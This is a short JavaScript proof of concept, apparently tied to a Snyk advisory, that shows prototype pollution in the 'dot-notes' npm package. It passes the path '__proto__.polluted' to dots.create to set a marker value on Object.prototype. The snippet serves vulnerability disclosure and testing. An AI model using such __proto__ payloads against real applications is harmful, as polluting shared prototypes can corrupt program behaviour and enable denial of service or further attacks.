//https://snyk.io/vuln/SNYK-JS-DOTNOTES-598668
const dots = require("dot-notes");
dots.create({}, "__proto__.polluted", "yes");
